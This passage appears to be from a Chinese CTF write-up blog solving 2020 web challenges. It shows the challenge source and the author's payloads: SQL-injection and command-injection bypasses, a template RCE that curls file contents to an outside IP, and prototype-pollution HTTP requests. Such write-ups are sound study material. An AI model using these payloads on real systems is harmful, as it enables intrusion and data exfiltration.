class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;conn.php&#x27;</span>;</span><br><span class="line">highlight_file(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">&quot;hash1&quot;</span>] != hash(<span class="string">&quot;md4&quot;</span>, $_GET[<span class="string">&quot;hash1&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;level 1 failed&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;hash2&#x27;</span>] === $_GET[<span class="string">&#x27;hash3&#x27;</span>] || md5($_GET[<span class="string">&#x27;hash2&#x27;</span>]) !== md5($_GET[<span class="string">&#x27;hash3&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;level 2 failed&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//level 3</span></span><br><span class="line">$query = <span class="string">&quot;SELECT * FROM flag WHERE password = &#x27;&quot;</span> . md5($_GET[<span class="string">&quot;hash4&quot;</span>],<span class="literal">true</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">$result = $mysqli-&gt;query($query);</span><br><span class="line">$row = $result-&gt;fetch_assoc(); </span><br><span class="line">var_dump($row);</span><br><span class="line">$result-&gt;free();</span><br><span class="line">$mysqli-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>第一关找0e+纯数字md4加密后还是0e+纯数字的字符串就行，脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"><span class="keyword">import</span> threading,time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md4</span>(<span class="params">s</span>):</span></span><br><span class="line">    obj = hashlib.new(<span class="string">&quot;md4&quot;</span>)</span><br><span class="line">    obj.update(s.encode())</span><br><span class="line">    <span class="keyword">return</span> obj.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">id</span>):</span></span><br><span class="line">    <span class="comment">#print(id)</span></span><br><span class="line">    enc=md4(<span class="string">&#x27;0e&#x27;</span>+str(id))</span><br><span class="line">    <span class="keyword">if</span> enc[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">&#x27;0e&#x27;</span> <span class="keyword">and</span> enc[<span class="number">2</span>:<span class="number">-1</span>].isdigit():</span><br><span class="line">        print(<span class="string">&#x27;0e&#x27;</span>+str(id))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    thread_pool = ThreadPoolExecutor(<span class="number">100</span>) </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1000000000</span>):</span><br><span class="line">        thread_pool.submit(check,i)</span><br></pre></td></tr></table></figure><p>第二关数组绕过,第三关和javisoj上的Login一样，找到一个字符串MD5加密后得到的原始二进制格式在SQL中拼接成 类似 <code>&#39;or&#39;xxx</code>的形式就可以绕过了</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?hash1&#x3D;0e251288019&amp;hash2[]&#x3D;1&amp;hash3[]&#x3D;&amp;hash4&#x3D;ffifdyop</span><br></pre></td></tr></table></figure><h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p>wireshark打开 导出http对象，发现<code>steghide.php</code>，foremost分离一张图片，steghide隐写，密码弱口令<code>123456</code></p><p><img src="/2020/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF2020-wp/QQ%E6%88%AA%E5%9B%BE20200824153623.png"></p><h3 id="主动"><a href="#主动" class="headerlink" title="主动"></a>主动</h3><p>就过滤了flag，用*绕过</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1||cat *</span><br></pre></td></tr></table></figure><p>查看源码得到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> 强网杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>国赛CISCN2020初赛-wp</title>
      <link href="2020/08/25/%E5%9B%BD%E8%B5%9B2020%E5%88%9D%E8%B5%9B-wp/"/>
      <url>2020/08/25/%E5%9B%BD%E8%B5%9B2020%E5%88%9D%E8%B5%9B-wp/</url>
      
        <content type="html"><![CDATA[<p>学长带我们打了打😀</p><a id="more"></a><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//题目环境：php:7.4.8-apache</span></span><br><span class="line">    $pid = pcntl_fork();</span><br><span class="line">    <span class="keyword">if</span> ($pid == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;could not fork&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> ($pid)&#123;</span><br><span class="line">        $r=pcntl_wait($status);</span><br><span class="line">        <span class="keyword">if</span>(!pcntl_wifexited($status))&#123;</span><br><span class="line">            phpinfo();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;is_string($_GET[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;!preg_match(<span class="string">&quot;/[:\\\\]|exec|pcntl/i&quot;</span>,$_GET[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">            call_user_func_array($_GET[<span class="string">&#x27;a&#x27;</span>],[$_GET[<span class="string">&#x27;b&#x27;</span>],<span class="literal">false</span>,<span class="literal">true</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        posix_kill(posix_getpid(), SIGUSR1);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>参考文章：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;raoxiaoya&#x2F;article&#x2F;details&#x2F;106604519</span><br></pre></td></tr></table></figure><p>可以知道只有让挂起的子进程退出才能执行phpinfo()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array($_GET[<span class="string">&#x27;a&#x27;</span>],[$_GET[<span class="string">&#x27;b&#x27;</span>],<span class="literal">false</span>,<span class="literal">true</span>]);</span><br></pre></td></tr></table></figure><p>call_user_func_array会调用回调函数，并把一个数组参数作为回调函数的参数</p><p>因此我们需要让<code>$_GET[&#39;a&#39;]</code>表示的函数能够接收三个参数，并且<code>$_GET[&#39;b&#39;]</code>表示的函数能够接收两个参数，用<code>pcntl_wait</code>和<code>pcntl_waitpid</code>让子进程退出</p><p>尝试构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;register_shutdown_function&amp;b&#x3D;pcntl_wait</span><br><span class="line">?a&#x3D;register_shutdown_function&amp;b&#x3D;pcntl_waitpid</span><br><span class="line">?a&#x3D;call_user_func&amp;b&#x3D;pcntl_wait</span><br><span class="line">?a&#x3D;call_user_func&amp;b&#x3D;pcntl_waitpid</span><br></pre></td></tr></table></figure><p>flag在phpinfo中，CTRL+F搜索flag</p><h3 id="rceme"><a href="#rceme" class="headerlink" title="rceme"></a>rceme</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">parserIfLabel($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">danger_key</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    $s=htmlspecialchars($s);</span><br><span class="line">    $key=<span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;server&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;cookie&#x27;</span>,<span class="string">&#x27;session&#x27;</span>,<span class="string">&#x27;sql&#x27;</span>,<span class="string">&#x27;mkdir&#x27;</span>,<span class="string">&#x27;copy&#x27;</span>,<span class="string">&#x27;fwrite&#x27;</span>,<span class="string">&#x27;del&#x27;</span>,<span class="string">&#x27;encrypt&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;shell&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;chroot&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;require&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;create&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;symlink&#x27;</span>,<span class="string">&#x27;sleep&#x27;</span>,<span class="string">&#x27;ord&#x27;</span>,<span class="string">&#x27;str&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;rev&#x27;</span>,<span class="string">&#x27;base_convert&#x27;</span>);</span><br><span class="line">    $s = str_ireplace($key,<span class="string">&quot;*&quot;</span>,$s);</span><br><span class="line">    $danger=<span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;preg&#x27;</span>,<span class="string">&#x27;server&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>,<span class="string">&#x27;decode&#x27;</span>,<span class="string">&#x27;html&#x27;</span>,<span class="string">&#x27;md5&#x27;</span>,<span class="string">&#x27;post&#x27;</span>,<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;cookie&#x27;</span>,<span class="string">&#x27;session&#x27;</span>,<span class="string">&#x27;sql&#x27;</span>,<span class="string">&#x27;mkdir&#x27;</span>,<span class="string">&#x27;copy&#x27;</span>,<span class="string">&#x27;fwrite&#x27;</span>,<span class="string">&#x27;del&#x27;</span>,<span class="string">&#x27;encrypt&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>,<span class="string">&#x27;shell&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;ini_&#x27;</span>,<span class="string">&#x27;chroot&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;passthru&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;require&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;create&#x27;</span>,<span class="string">&#x27;func&#x27;</span>,<span class="string">&#x27;symlink&#x27;</span>,<span class="string">&#x27;sleep&#x27;</span>,<span class="string">&#x27;ord&#x27;</span>,<span class="string">&#x27;str&#x27;</span>,<span class="string">&#x27;source&#x27;</span>,<span class="string">&#x27;rev&#x27;</span>,<span class="string">&#x27;base_convert&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($danger <span class="keyword">as</span> $val)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strpos($s,$val) !==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;很抱歉，执行出错，发现危险字符【&#x27;</span>.$val.<span class="string">&#x27;】&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^[a-z]$/i&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;很抱歉，执行出错，发现危险字符&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parserIfLabel</span>(<span class="params"> $content </span>) </span>&#123;</span><br><span class="line">    $pattern = <span class="string">&#x27;/\&#123;if:([\s\S]+?)&#125;([\s\S]*?)&#123;end\s+if&#125;/&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( preg_match_all( $pattern, $content, $matches ) ) &#123;</span><br><span class="line">        $count = count( $matches[ <span class="number">0</span> ] );</span><br><span class="line">        <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $count; $i++ ) &#123;</span><br><span class="line">            $flag = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            $out_html = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            $ifstr = $matches[ <span class="number">1</span> ][ $i ];</span><br><span class="line">            $ifstr=danger_key($ifstr,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(strpos($ifstr,<span class="string">&#x27;=&#x27;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">                $arr= splits($ifstr,<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">                <span class="keyword">if</span>($arr[<span class="number">0</span>]==<span class="string">&#x27;&#x27;</span> || $arr[<span class="number">1</span>]==<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;很抱歉，模板中有错误的判断,请修正【&#x27;</span>.$ifstr.<span class="string">&#x27;】&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                $ifstr = str_replace( <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;==&#x27;</span>, $ifstr );</span><br><span class="line">            &#125;</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;&lt;&gt;&#x27;</span>, <span class="string">&#x27;!=&#x27;</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;||&#x27;</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;&amp;&amp;&#x27;</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;mod&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, $ifstr );</span><br><span class="line">            $ifstr = str_replace( <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, $ifstr );</span><br><span class="line">            <span class="keyword">if</span> ( preg_match( <span class="string">&#x27;/\&#123;|&#125;/&#x27;</span>, $ifstr)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;很抱歉，模板中有错误的判断,请修正&#x27;</span>.$ifstr);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                @<span class="keyword">eval</span>( <span class="string">&#x27;if(&#x27;</span> . $ifstr . <span class="string">&#x27;)&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&#x27;</span> );</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( preg_match( <span class="string">&#x27;/([\s\S]*)?\&#123;else\&#125;([\s\S]*)?/&#x27;</span>, $matches[ <span class="number">2</span> ][ $i ], $matches2 ) ) &#123;</span><br><span class="line">                <span class="keyword">switch</span> ( $flag ) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;if&#x27;</span>:</span><br><span class="line">                        <span class="keyword">if</span> ( <span class="keyword">isset</span>( $matches2[ <span class="number">1</span> ] ) ) &#123;</span><br><span class="line">                            $out_html .= $matches2[ <span class="number">1</span> ];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;else&#x27;</span>:</span><br><span class="line">                        <span class="keyword">if</span> ( <span class="keyword">isset</span>( $matches2[ <span class="number">2</span> ] ) ) &#123;</span><br><span class="line">                            $out_html .= $matches2[ <span class="number">2</span> ];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> ( $flag == <span class="string">&#x27;if&#x27;</span> ) &#123;</span><br><span class="line">                $out_html .= $matches[ <span class="number">2</span> ][ $i ];</span><br><span class="line">            &#125;</span><br><span class="line">            $pattern2 = <span class="string">&#x27;/\&#123;if([0-9]):/&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> ( preg_match( $pattern2, $out_html, $matches3 ) ) &#123;</span><br><span class="line">                $out_html = str_replace( <span class="string">&#x27;&#123;if&#x27;</span> . $matches3[ <span class="number">1</span> ], <span class="string">&#x27;&#123;if&#x27;</span>, $out_html );</span><br><span class="line">                $out_html = str_replace( <span class="string">&#x27;&#123;else&#x27;</span> . $matches3[ <span class="number">1</span> ] . <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&#123;else&#125;&#x27;</span>, $out_html );</span><br><span class="line">                $out_html = str_replace( <span class="string">&#x27;&#123;end if&#x27;</span> . $matches3[ <span class="number">1</span> ] . <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&#123;end if&#125;&#x27;</span>, $out_html );</span><br><span class="line">                $out_html = <span class="keyword">$this</span>-&gt;parserIfLabel( $out_html );</span><br><span class="line">            &#125;</span><br><span class="line">            $content = str_replace( $matches[ <span class="number">0</span> ][ $i ], $out_html, $content );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">splits</span>(<span class="params"> $s, $str=<span class="string">&#x27;,&#x27;</span> </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">empty</span>( $s ) ) <span class="keyword">return</span> <span class="keyword">array</span>( <span class="string">&#x27;&#x27;</span> );</span><br><span class="line">    <span class="keyword">if</span> ( strpos( $s, $str ) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> explode( $str, $s );</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>( $s );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目改自zzzphp rce，参考文章：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;y4er.com&#x2F;post&#x2F;zzzphp-rce&#x2F;</span><br></pre></td></tr></table></figure><p>发现过滤了str，因此作者的那种方法用不了了，直接反引号命令执行，用curl外带出flag，构造payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a&#x3D;&#123;if:1)&#96;curl 47.97.210.141:9000&#x2F;\&#96;cat &#x2F;fl*\&#96;&#96;;&#x2F;&#x2F;&#125;&#123;end if&#125;</span><br></pre></td></tr></table></figure><p>服务端用nc监听即可得到flag</p><h3 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a>littlegame</h3><p>看了看主要代码，发现得到flag的条件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> key = req.body.key.toString();</span><br><span class="line"><span class="keyword">let</span> password = req.body.password.toString();</span><br><span class="line"><span class="keyword">if</span>(Admin[key] === password)&#123;</span><br><span class="line">res.send(process.env.flag);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且key和password是可控的，接着发现setFn这个敏感函数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> key = req.body.NewAttributeKey.toString();</span><br><span class="line"><span class="keyword">let</span> value = req.body.NewAttributeValue.toString();</span><br><span class="line">setFn(req.session.knight, key, value);</span><br></pre></td></tr></table></figure><p>发现是引入set-value这个包得到的：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> setFn = <span class="built_in">require</span>(<span class="string">&#x27;set-value&#x27;</span>);</span><br></pre></td></tr></table></figure><p>搜了下，搜到了这篇文章：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-JS-SETVALUE-450213</span><br></pre></td></tr></table></figure><p>js原型链污染，为所有对象增加aaa属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;Privilege HTTP&#x2F;1.1</span><br><span class="line">Host: eci-2zefq4smu48613r6o17l.cloudeci1.ichunqiu.com:8888</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko&#x2F;20100101 Firefox&#x2F;79.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: __jsluid_h&#x3D;93637ceba89c6fddd5299faa318a6cea; session&#x3D;s%3A7wfZ0-VLrHUCedTzvR8lbsdb9yZkkEZH.8uPhesdOIoUUYn73e63GfvympMqk%2FiBm3cJ6avzlyaY</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">If-Modified-Since: Thu, 20 Aug 2020 08:01:33 GMT</span><br><span class="line">If-None-Match: W&#x2F;&quot;1cb-1740ae32748&quot;</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 51</span><br><span class="line"></span><br><span class="line">NewAttributeKey&#x3D;__proto__.aaa&amp;NewAttributeValue&#x3D;aaa</span><br></pre></td></tr></table></figure><p>用污染的键值得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;DeveloperControlPanel HTTP&#x2F;1.1</span><br><span class="line">Host: eci-2zefq4smu48613r6o17l.cloudeci1.ichunqiu.com:8888</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko&#x2F;20100101 Firefox&#x2F;79.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: __jsluid_h&#x3D;93637ceba89c6fddd5299faa318a6cea; session&#x3D;s%3A7wfZ0-VLrHUCedTzvR8lbsdb9yZkkEZH.8uPhesdOIoUUYn73e63GfvympMqk%2FiBm3cJ6avzlyaY</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">If-Modified-Since: Thu, 20 Aug 2020 08:01:33 GMT</span><br><span class="line">If-None-Match: W&#x2F;&quot;1cb-1740ae32748&quot;</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 20</span><br><span class="line"></span><br><span class="line">key&#x3D;aaa&amp;password&#x3D;aaa</span><br></pre></td></tr></table></figure><h3 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a>easytrick</h3><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 